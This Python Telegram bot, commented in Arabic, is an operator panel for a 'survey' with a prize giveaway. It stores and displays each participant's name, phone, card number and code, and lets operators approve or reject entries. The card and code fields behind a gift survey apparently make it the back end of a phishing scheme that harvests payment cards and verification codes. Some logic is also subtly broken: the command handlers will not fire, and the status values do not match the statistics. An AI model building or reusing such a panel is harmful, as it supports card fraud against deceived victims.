import telebot
import json
import time
from datetime import datetime

# إعداد البوت
TOKEN = "YOUR_BOT_TOKEN_HERE"  # ضع توكن بوتك هنا
bot = telebot.TeleBot(TOKEN)

# قاعدة البيانات البسيطة
SURVEYS_FILE = "surveys.json"

def load_surveys():
    try:
        with open(SURVEYS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return []

def save_surveys(surveys):
    with open(SURVEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(surveys, f, ensure_ascii=False, indent=2)

def format_survey(survey):
    return f"""
📋 *بيانات المشاركة*
🆔 رقم المشاركة: {survey['id']}
👤 الاسم: {survey['name']}
📞 الهاتف: {survey['phone']}
💳 البطاقة: {survey['card']}
🔐 الرمز: {survey['code']}
📅 التاريخ: {survey['date']}
✅ الحالة: {survey.get('status', 'pending')}
"""

# أمر البدء
@bot.message_handler(commands=['start'])
def start(message):
    keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add("📊 الإحصائيات", "📋 المعلقة", "✅ المقبولة")
    keyboard.add("🎁 الفائزين", "🔄 تحديث")
    
    bot.send_message(
        message.chat.id,
        "🛠️ *مرحباً بك في لوحة تحكم الاستبيانات*\n\n"
        "استخدم الأزرار للتحكم في النظام",
        reply_markup=keyboard,
        parse_mode="Markdown"
    )

# معالجة الأزرار
@bot.message_handler(func=lambda m: True)
def handle_buttons(message):
    surveys = load_surveys()
    
    if message.text == "📊 الإحصائيات":
        total = len(surveys)
        pending = len([s for s in surveys if s.get('status') == 'pending'])
        approved = len([s for s in surveys if s.get('status') == 'approved'])
        
        stats = f"""
📈 *إحصائيات الاستبيانات*
        
👥 إجمالي المشاركين: {total}
⏳ بانتظار المراجعة: {pending}
✅ المقبولة: {approved}
🎁 الهدايا المتبقية: {150 - approved}
        """
        
        bot.send_message(message.chat.id, stats, parse_mode="Markdown")
        
    elif message.text == "📋 المعلقة":
        pending_surveys = [s for s in surveys if s.get('status') == 'pending']
        
        if not pending_surveys:
            bot.send_message(message.chat.id, "✅ لا توجد استبيانات معلقة")
            return
            
        for survey in pending_surveys[:10]:  # عرض أول 10 فقط
            bot.send_message(
                message.chat.id,
                format_survey(survey) + f"\n\n✅ للموافقة: /approve_{survey['id']}\n❌ للرفض: /reject_{survey['id']}",
                parse_mode="Markdown"
            )
            
    elif message.text == "✅ المقبولة":
        approved_surveys = [s for s in surveys if s.get('status') == 'approved']
        
        if not approved_surveys:
            bot.send_message(message.chat.id, "⚠️ لا توجد استبيانات مقبولة بعد")
            return
            
        for survey in approved_surveys[:10]:
            bot.send_message(message.chat.id, format_survey(survey), parse_mode="Markdown")

# معالجة أوامر الموافقة والرفض
@bot.message_handler(commands=['approve_', 'reject_'])
def handle_approval(message):
    try:
        command = message.text.split('_')[0][1:]  # approve أو reject
        survey_id = message.text.split('_')[1]
        
        surveys = load_surveys()
        
        for survey in surveys:
            if survey['id'] == survey_id:
                survey['status'] = command
                survey['reviewed_by'] = message.from_user.username
                survey['reviewed_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                save_surveys(surveys)
                
                response = f"""
✅ *تم {command} الاستبيان بنجاح*
                
🆔 رقم المشاركة: {survey_id}
👤 الاسم: {survey['name']}
📞 الهاتف: {survey['phone']}
👮 المراجع: @{message.from_user.username}
⏰ وقت المراجعة: {survey['reviewed_at']}
                """
                
                bot.send_message(message.chat.id, response, parse_mode="Markdown")
                return
                
        bot.send_message(message.chat.id, "❌ لم يتم العثور على الاستبيان")
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ حدث خطأ: {str(e)}")

# تشغيل البوت
print("🤖 البوت يعمل...")
bot.polling(none_stop=True)